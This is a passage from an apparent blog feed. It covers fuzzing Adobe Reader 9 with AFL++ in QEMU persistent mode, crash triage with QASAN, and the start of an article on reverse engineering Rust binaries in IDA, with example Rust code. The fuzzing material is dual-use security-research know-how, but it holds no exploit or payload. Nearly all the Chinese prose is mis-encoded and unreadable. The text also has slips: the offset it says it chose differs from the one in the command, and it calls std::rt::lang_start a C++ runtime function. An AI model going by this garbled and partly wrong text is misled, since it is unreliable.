class="language-bash">fuzzå¼‚æ¶æ„</span><br>CPU_TARGET=arm ./build_qemu_support.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ç§»æ¤</span><br>STATIC=1 HOST=arm-linux-gnueabi CPU_TARGET=arm ./build_qemu_support.sh<br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">afl-fuzz -<span class="hljs-selector-tag">i</span> in -o out -m <span class="hljs-attribute">none</span> -<span class="hljs-selector-tag">Q</span> ./test<br></code></pre></td></tr></table></figure><h3 id="qemuæ¨¡å¼"><a href="#qemuæ¨¡å¼" class="headerlink" title="qemuæ¨¡å¼"></a>qemuæ¨¡å¼</h3><p>ä½¿ç”¨<code>-Q</code>å‚æ•°å¼€å¯ qemu modeã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@<br><br>afl-fuzz -Q -i ./in -o ./out -t 2000 -- mb @@<br></code></pre></td></tr></table></figure><p>ä½†ç°åœ¨æ¨¡ç³Šæµ‹è¯•é€Ÿåº¦éå¸¸æ…¢ï¼šåœ¨æˆ‘çš„æœºå™¨ä¸Šå¤§çº¦æ¯ç§’7æ¬¡æ‰§è¡Œã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•æé«˜æ¨¡ç³Šæµ‹è¯•é€Ÿåº¦å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æ¥ä¸‹æ¥äº†è§£ qemu çš„æŒä¹…æ¨¡å¼ã€‚</p><h3 id="æŒä¹…æ¨¡å¼-1"><a href="#æŒä¹…æ¨¡å¼-1" class="headerlink" title="æŒä¹…æ¨¡å¼"></a>æŒä¹…æ¨¡å¼</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒAFL++ æ¯æ¬¡å˜å¼‚ä¸€ä¸ªè¾“å…¥æ ·æœ¬å°±ä¼š <strong>é‡æ–°å¯åŠ¨ç›®æ ‡ç¨‹åº</strong>ï¼Œè¿™åœ¨å¤§å‹ç¨‹åºï¼ˆå¦‚ Adobe Readerï¼‰ä¸­éå¸¸ä½æ•ˆã€‚</p><p>æŒä¹…æ¨¡å¼é€šè¿‡ <strong>åœ¨ä¸€æ¬¡ç¨‹åºè¿è¡Œä¸­å¤„ç†å¤šä¸ªè¾“å…¥</strong> æ¥æ˜¾è‘—æé«˜æ€§èƒ½ã€‚</p><p>å¦‚æˆ‘ä»¬åœ¨<a href="typora://app/Exercise%206">ç»ƒä¹ 6</a>ä¸­çœ‹åˆ°çš„ï¼Œæ’å…¥<code>AFL_LOOP</code>æ˜¯æˆ‘ä»¬å‘Šè¯‰AFL++è¦å¯ç”¨æŒä¹…æ¨¡å¼çš„æ–¹å¼ã€‚ä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•è®¿é—®æºä»£ç ã€‚</p><p>ä½¿ç”¨ <strong><code>AFL_QEMU_PERSISTENT_ADDR</code></strong> æŒ‡å®šä¸€ä¸ª <strong>å‡½æ•°çš„åœ°å€</strong>ï¼Œå‘Šè¯‰ AFL++ åœ¨é‚£é‡Œæ’å…¥æŒä¹…å¾ªç¯é’©å­ï¼Œä»è€Œé¿å…é‡å¤åŠ è½½ç¨‹åºã€‚</p><p>ä¸ºäº†æ‰¾åˆ°åˆé€‚çš„åç§»é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åƒIDAæˆ–Ghidraè¿™æ ·çš„åæ±‡ç¼–å·¥å…·ã€‚åœ¨æˆ‘çš„ä¾‹å­ä¸­ï¼Œæˆ‘é€‰æ‹©äº†åç§»é‡<code>0x08546a00</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install valgrind kcachegrind<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ callgrind æ”¶é›†è¿è¡Œæ•°æ®ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader \<br>ACRO_CONFIG=intellinux \<br>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; \<br>valgrind --tool=callgrind /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript sample.pdf<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>kcachegrind</code> æ‰“å¼€ç”Ÿæˆçš„ <code>callgrind.out.*</code> æ–‡ä»¶ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">kcachegrind</span><br></code></pre></td></tr></table></figure><p>å»ºè®®ä½ åœ¨kcachegrindä¸­æŸ¥çœ‹<code>count</code>å­—æ®µï¼Œè¯†åˆ«åªæ‰§è¡Œ1æ¬¡çš„å‡½æ•°ï¼Œå¹¶å°è¯•åœ¨afl-fuzzä¸­è¾¾åˆ°<strong>è¶…è¿‡90%çš„ç¨³å®šæ€§åˆ†æ•°</strong>ã€‚</p><p>æˆ‘ä»¬è¿˜å°†è®¾ç½®<strong>AFL_QEMU_PERSISTENT_GPR&#x3D;1</strong>ç¯å¢ƒå˜é‡ï¼Œå®ƒå°†åœ¨æ¯ä¸ªæŒä¹…å‘¨æœŸä¸­ä¿å­˜å’Œæ¢å¤é€šç”¨å¯„å­˜å™¨çš„åŸå§‹å€¼ã€‚</p><p>ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤è¡Œè¿è¡Œæ¨¡ç³Šæµ‹è¯•å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_QEMU_PERSISTENT_ADDR=0x085478AC \<br>AFL_QEMU_PERSISTENT_GPR=1 \<br>ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader \<br>ACRO_CONFIG=intellinux \<br>LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; \<br>afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- \<br>/opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@<br><br></code></pre></td></tr></table></figure><p>å¦‚ä½ æ‰€è§ï¼Œæ‰§è¡Œæ—¶é—´æé«˜äº†4å€ã€‚ä¸é”™ï¼</p><h3 id="Fuzz-1"><a href="#Fuzz-1" class="headerlink" title="Fuzz"></a>Fuzz</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:&#x27;/opt/Adobe/Reader9/Reader/intellinux/lib&#x27; /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><h3 id="crashåˆ†æ-1"><a href="#crashåˆ†æ-1" class="headerlink" title="crashåˆ†æ"></a>crashåˆ†æ</h3><p>åœ¨å‘ç”Ÿ crash ä¹‹åï¼Œä½¿ç”¨ afl-qemu-trace æ¥æŸ¥çœ‹æœ€ç»ˆçš„crashä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><p>ç›´æ¥æŒ‰ç…§ä¸Šé¢çš„å¸¸è§„çš„å‘½ä»¤æ¥æ‰§è¡Œ traceï¼Œä¼šæŠ¥é¡µé”™è¯¯ã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨å¦å¤–ä¸€ç§æ–¹æ³•â€”â€”Â <a href="https://github.com/andreafioraldi/qasan">QASAN</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] <br></code></pre></td></tr></table></figure><h2 id="åè¨€"><a href="#åè¨€" class="headerlink" title="åè¨€"></a>åè¨€</h2><p>åœ¨ AFL++ çš„ utils ç›®å½•ä¸­æä¾›äº†å„ç§å„æ ·çš„è¾…åŠ© Fuzz çš„å·¥å…·ã€‚</p><p>é™¤äº† AFL ä¹‹å¤–å¸¸ç”¨çš„è¿˜æœ‰ libFuzzerå’Œhonggfuzzã€‚å…¶ä¸­ libFuzzer æ˜¯ä¸€ä¸ªå’Œ AFL å®Œå…¨ä¸åŒçš„ Fuzz å·¥å…·ï¼Œå®ƒæ˜¯ä¸€ç§æ–°çš„æ€æƒ³çš„å®ç°ï¼Œå¯ä»¥è¯´åæ¥çš„ go-fuzz ç­‰å·¥å…·éƒ½æ˜¯åŸºäºå®ƒçš„æ€æƒ³æ¥å®ç°çš„ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote><p>Fuzzing: A Survey for Roadmap<br><a href="https://github.com/u1f383/fuzzing-learning-in-30-days/tree/main#">u1f383&#x2F;fuzzing-learning-in-30-days</a><br><a href="https://paper.seebug.org/841/">AFL æ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆä¸€ï¼‰ï¼šç”¨ AFL å¼€å§‹ä½ çš„ç¬¬ä¸€æ¬¡ Fuzzing</a><br><a href="https://paper.seebug.org/842/#_4">AFL æ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆäºŒï¼‰ï¼šFuzz ç»“æœåˆ†æå’Œä»£ç è¦†ç›–ç‡</a><br><a href="https://www.v4ler1an.com/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B1/#%E4%B8%80%E7%AE%80%E4%BB%8B">AFLäºŒä¸‰äº‹ â€“ 1 - V4ler1an</a><br><a href="https://github.com/strongcourage/fuzzing-corpus/tree/master">strongcourage&#x2F;fuzzing-corpus: My fuzzing corpus</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzers </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rusté€†å‘åˆ†æ</title>
      <link href="/2025/07/01/ctf/re/rust/"/>
      <url>/2025/07/01/ctf/re/rust/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><h2 id="print-å®é€†å‘"><a href="#print-å®é€†å‘" class="headerlink" title="print!å®é€†å‘"></a><code>print!</code>å®é€†å‘</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p><code>print!</code>æ˜¯ rust ä¸­ç”¨äºè¾“å‡ºçš„å®ï¼Œrustä¸­çš„å®åœ¨ç¼–è¯‘é˜¶æ®µä¼šå±•å¼€æˆå…·ä½“çš„ä»£ç ï¼Œ<code>print!</code>å®æ¯”è¾ƒå¸¸è§ï¼Œå±•å¼€åçš„ä»£ç æ¯”è¾ƒå¤æ‚ï¼Œå­¦ä¹ åˆ†æ<code>print</code>è¯­å¥å¯ä»¥å¸®åŠ©ç†æ¸…ç¨‹åºé€»è¾‘ã€‚</p><p>é™¤äº†<code>println!</code>å®å¤–è¿˜æœ‰<code>print!</code>å®ï¼Œå®ƒä»¬çš„åŒºåˆ«å°±æ˜¯åœ¨ç¼–è¯‘æ—¶ç¼–è¯‘å™¨ä¼šåœ¨<code>println!</code>æ‰€è¾“å‡ºçš„å†…å®¹ååŠ ä¸€ä¸ª<code>\n</code>ã€‚</p><h3 id="å®å±•å¼€åˆ†æ"><a href="#å®å±•å¼€åˆ†æ" class="headerlink" title="å®å±•å¼€åˆ†æ"></a>å®å±•å¼€åˆ†æ</h3><ul><li>ç¤ºä¾‹ä»£ç </li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;hello world&quot;</span>);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ç¤ºä¾‹ä»£ç ç¼–è¯‘åï¼Œé€šè¿‡ ida è¿›è¡Œé€†å‘ã€‚</p><blockquote><p>æ³¨ï¼šæ ¹æ®ç»éªŒåœ¨é€†å‘ rust ä¸Šï¼Œida 9 è¦æ¯”å…¶å®ƒç‰ˆæœ¬å¥½ç”¨çš„å¤šã€‚</p></blockquote><p>åœ¨<code>main</code>å‡½æ•°ä¸­é€šè¿‡<code>std::rt::lang_start</code>å¯åŠ¨ç¨‹åºå¹¶è°ƒç”¨ç”¨æˆ·å®šä¹‰çš„<code>demo::main</code>å‡½æ•°ã€‚<code>std::rt::lang_start</code>æ˜¯ C++ çš„è¿è¡Œæ—¶åº“å‡½æ•°ï¼Œè´Ÿè´£ç¨‹åºåˆå§‹åŒ–ï¼Œå¹¶æœ€ç»ˆè°ƒç”¨ç”¨æˆ·çš„<code>main</code>å‡½æ•°ã€‚</p><p><img src="/assets/Pasted%20image%2020250325132216.png"></p><p>è·Ÿè¿›<code>demo::main</code>å‡½æ•°ã€‚</p><p><code>core::fmt::Arguments::new_const(v0, &amp;off_55F08);</code>è¿™è¡Œä»£ç åˆ›å»ºäº†ä¸€ä¸ªæ ¼å¼åŒ–å‚æ•°å¯¹è±¡ã€‚å®ƒä½¿ç”¨<code>v0</code>æ•°ç»„ä½œä¸ºå†…å­˜å­˜å‚¨ï¼Œå¹¶é€šè¿‡<code>off_55F08</code>æŒ‡å®šçš„å¸¸é‡ä½œä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æˆ–æ•°æ®ã€‚</p><p><code>v0</code>å°±æ˜¯æˆ‘ä»¬è¦è¾“å‡ºçš„<code>hello world</code>ã€‚</p><p><img src="/assets/Pasted%20image%2020250325132818.png"></p><p><img src="/assets/Pasted%20image%2020250325132849.png"></p><p><code>std::io::stdio::_print();</code>è¿™è¡Œä»£ç å°†ä¸Šè¿°æ ¼å¼åŒ–å‚æ•°ä¼ é€’ç»™æ ‡å‡†è¾“å‡ºçš„æ‰“å°å‡½æ•°ï¼Œè¾“å‡ºåˆ°å±å¹•ã€‚</p><p><img src="/assets/Pasted%20image%2020250325132613.png"></p><p>è¿™æ®µä»£ç æ˜¯ Rust æ ‡å‡†åº“ä¸­å®ç° <code>std::io::stdio::_print()</code> å‡½æ•°çš„éƒ¨åˆ†ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯é€šè¿‡æ ‡å‡†è¾“å‡ºï¼ˆSTDOUTï¼‰å°†æ•°æ®æ‰“å°åˆ°å±å¹•ã€‚ä¸‹é¢æ˜¯è¿™æ®µä»£ç çš„ç®€è¦åˆ†æï¼š</p><ol><li><p><strong>å˜é‡åˆå§‹åŒ–</strong>ï¼š</p><ul><li><code>v8[0] = aStdout;</code> å’Œ <code>v8[1] = 6LL;</code> åˆå§‹åŒ–äº†ä¸€ä¸ªæ•°ç»„ <code>v8</code>ï¼Œå…¶ä¸­ <code>aStdout</code> å¯èƒ½æ˜¯æ ‡å‡†è¾“å‡ºæµçš„æŒ‡é’ˆï¼Œ6 ä»£è¡¨è¾“å‡ºçš„ç›®æ ‡ï¼ˆä¾‹å¦‚ <code>STDOUT</code>ï¼‰ã€‚</li></ul></li><li><p><strong>æ¡ä»¶æ£€æŸ¥</strong>ï¼š</p><ul><li><p><code>if ( !v0 )</code> è¿™é‡Œçš„ <code>v0</code> æ˜¯ä¸€ä¸ªå­—èŠ‚å€¼ï¼Œé€šå¸¸ç”¨æ¥è¡¨ç¤ºä¸€äº›çŠ¶æ€ä¿¡æ¯ã€‚å¦‚æœ <code>v0</code> ä¸º 0ï¼Œåˆ™è¿›å…¥æ‰“å°è¿‡ç¨‹ã€‚</p></li><li><p><code>if ( dword_5A1B0 != 3 )</code> æ£€æŸ¥æŸä¸ªçŠ¶æ€å˜é‡ï¼Œå¯èƒ½æ¶‰åŠæ˜¯å¦éœ€è¦åˆå§‹åŒ–ä¸€æ¬¡é”æœºåˆ¶ã€‚</p></li></ul></li><li><p><strong>åˆå§‹åŒ–ä¸æ ¼å¼åŒ–å†™å…¥</strong>ï¼š</p><ul><li><p><code>v9 = &amp;std::io::stdio::STDOUT;</code> è·å–æ ‡å‡†è¾“å‡ºæµçš„æŒ‡é’ˆã€‚</p></li><li><p><code>v3 = &amp;v9;</code> è®¾ç½®ä¸€ä¸ªæŒ‡å‘æŒ‡é’ˆ <code>v9</code> çš„æŒ‡é’ˆ <code>v3</code>ï¼Œè¿™ä¸ªæŒ‡é’ˆæœ€ç»ˆä¼šä¼ é€’ç»™ <code>write_fmt</code> å‡½æ•°è¿›è¡Œæ ¼å¼åŒ–å†™å…¥ã€‚</p></li><li><p><code>&lt;&amp;std::io::stdio::Stdout as std::io::Write&gt;::write_fmt();</code> è¿™ä¸€è¡Œä½¿ç”¨ <code>write_fmt</code> æ¥å°†æ ¼å¼åŒ–çš„æ•°æ®å†™å…¥æ ‡å‡†è¾“å‡ºï¼ˆ<code>STDOUT</code>ï¼‰ã€‚</p></li></ul></li><li><p><strong>é”™è¯¯å¤„ç†ä¸ panic</strong>ï¼š</p><ul><li><p>å¦‚æœå‘ç”Ÿé”™è¯¯ï¼ˆ<code>v1</code> éé›¶ï¼‰ï¼Œåˆ™è¿›å…¥é”™è¯¯å¤„ç†éƒ¨åˆ†ã€‚<code>v2</code> æ•°ç»„ä¸­ä¿å­˜äº†æ ¼å¼åŒ–è¾“å‡ºçš„å‚æ•°ã€‚</p></li><li><p><code>core::panicking::panic_fmt();</code> ä¼šè§¦å‘ panicï¼ŒæŠ›å‡ºé”™è¯¯ä¿¡æ¯ï¼Œé€šå¸¸åœ¨é‡åˆ°æ— æ³•æ¢å¤çš„é”™è¯¯æ—¶è°ƒç”¨ã€‚</p></li></ul></li></ol><p><img src="/assets/Pasted%20image%2020250325132927.png"></p><p><img src="/assets/Pasted%20image%2020250405113420.png"></p><p><img src="/assets/Pasted%20image%2020250405113442.png"></p><h2 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h2><h3 id="stringã€-str"><a href="#stringã€-str" class="headerlink" title="stringã€&amp;str"></a>stringã€&amp;str</h3><p><img src="/assets/Pasted%20image%2020250405113637.png"></p><p>stringçš„å¸ƒå±€ä¸vectorä¸€è‡´ã€‚</p><p><img src="/assets/Pasted%20image%2020250217000153.png"></p><p><img src="/assets/Pasted%20image%2020250217000333.png"></p><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a><code>struct</code></h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    name: <span class="hljs-type">String</span>,<br>    age: <span class="hljs-type">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Unit</span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Pair</span>(<span class="hljs-type">i32</span>, <span class="hljs-type">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> &#123;<br>    x: <span class="hljs-type">f32</span>,<br>    y: <span class="hljs-type">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Rectangle</span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">name</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">age</span> = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">peter</span> = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">point</span>: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">bottom_right</span> = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">Point</span> &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">_rectangle</span> = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">_unit</span> = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">pair</span> = <span class="hljs-title function_ invoke__">Pair</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">Pair</span>(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h3><p><img src="/assets/Pasted%20image%2020250217000230.png"></p><h3 id="vec"><a href="#vec" class="headerlink" title="vec"></a><code>vec</code></h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-comment">// Iterators can be collected into vectors</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">collected_iterator</span>: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">i32</span>&gt; = (<span class="hljs-number">0</span>..<span class="hljs-number">10</span>).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Collected (0..10) into: &#123;:?&#125;&quot;</span>, collected_iterator);<br><br>    <span class="hljs-comment">// The `vec!` macro can be used to initialize a vector</span><br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">xs</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1i32</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Initial vector: &#123;:?&#125;&quot;</span>, xs);<br><br>    <span class="hljs-comment">// Insert new element at the end of the vector</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Push 4 into the vector&quot;</span>);<br>    xs.<span class="hljs-title function_ invoke__">push</span>(<span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Vector: &#123;:?&#125;&quot;</span>, xs);<br><br>    <span class="hljs-comment">// Error! Immutable vectors can&#x27;t grow</span><br>    <span class="hljs-comment">// collected_iterator.push(0);</span><br>    <span class="hljs-comment">// FIXME ^ Comment out this line</span><br><br>    <span class="hljs-comment">// The `len` method yields the number of elements currently stored in a vector</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;Vector length: &#123;&#125;&quot;</span>, xs.<span class="hljs-title function_ invoke__">len</span>());<br><br>    <span class="hljs-comment">// Indexing is done using the square brackets (indexing starts at 0)</span><br>    <span class="hljs-built_in">println!</span>(<span 